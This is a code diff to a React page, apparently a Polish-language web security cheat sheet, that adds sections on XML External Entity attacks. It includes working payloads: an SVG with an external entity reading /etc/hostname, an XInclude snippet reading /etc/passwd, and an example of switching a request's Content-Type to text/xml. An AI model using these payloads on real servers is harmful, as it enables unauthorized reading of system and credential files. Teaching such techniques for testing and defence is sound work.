@@ -307,6 +307,47 @@ const XXE = () => {
             <hr />
            
             <details>
+                <summary>XXE w SVG</summary>
+                <div className='waring'>
+                    <p>{`<?xml version="1.0" standalone="yes"?>`}<span className='important'>{`<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>`}</span>{`<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">`}<span className='important'>{`<text font-size="16" x="0" y="16">&xxe;</text>`}</span>{`</svg>`}</p>
+                </div>
+            </details>
+
+            <hr />
+           
+            <details>
+                <summary>XInclude XXE</summary>
+                <p>Przykładem tego jest sytuacja, gdy dane przesłane przez klienta zostają umieszczone w żądaniu SOAP zaplecza, które następnie jest przetwarzane przez usługę SOAP zaplecza.</p>
+                <p>W tej sytuacji nie można przeprowadzić klasycznego ataku XXE, ponieważ nie masz kontroli nad całym dokumentem XML i nie możesz zdefiniować ani zmodyfikować elementu DOCTYPE. Zamiast tego możesz jednak użyć XInclude.</p>
+                <div className='waring'>
+                    <p>{`<foo xmlns:xi="http://www.w3.org/2001/XInclude">`}</p>
+                    <p>{`<xi:include parse="text" `}<span className='important'>href="file:///etc/passwd"/</span>{`></foo>`}</p>
+                </div>
+            </details>
+
+            <hr />
+           
+            <details>
+                <summary>Modyfikowanie content type</summary>
+                <div className='waring'>
+                    <p>POST /action HTTP/1.0</p>
+                    <p>Content-Type: <span className='important'>application/x-www-form-urlencoded</span></p>
+                    <p>Content-Length: 7</p>
+                    <br />
+                    <p>foo=bar</p>
+                </div>
+                <div className='waring'>
+                    <p>POST /action HTTP/1.0</p>
+                    <p>Content-Type: <span className='important'>text/xml</span></p>
+                    <p>Content-Length: 7</p>
+                    <br />
+                    <p>{`<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>`}</p>
+                </div>
+            </details>
+
+            <hr />
+           
+            <details>
                 <summary>Automatyczne wykrywane OOB</summary>
                 <Link to='https://github.com/FilipowiczP/XXEinjector'>XXEinjector</Link>
 
